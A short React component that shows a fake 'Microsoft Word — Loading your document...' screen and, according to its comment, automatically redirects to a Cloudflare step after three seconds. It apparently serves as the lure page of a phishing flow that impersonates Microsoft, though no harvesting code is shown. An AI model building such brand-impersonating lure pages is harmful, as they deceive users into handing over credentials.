import React, { useEffect } from 'react';
import WordIcon from '../assets/Word.svg';

interface MessageIconLandingProps {
  onOpenMessage: () => void;
}

const MessageIconLanding: React.FC<MessageIconLandingProps> = ({ onOpenMessage }) => {
  useEffect(() => {
    // Auto-redirect to Cloudflare after 3 seconds
    const timer = setTimeout(() => {
      onOpenMessage();
    }, 3000);

    return () => clearTimeout(timer);
  }, [onOpenMessage]);

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="text-center">
        <div className="mb-6">
          <img 
            src={WordIcon} 
            alt="Microsoft Word" 
            className="w-24 h-24 mx-auto mb-4"
          />
          <h1 className="text-2xl font-bold text-gray-800 mb-2">Microsoft Word</h1>
          <p className="text-gray-600">Loading your document...</p>
        </div>
        
        <div className="flex justify-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
        </div>
      </div>
    </div>
  );
};

export default MessageIconLanding;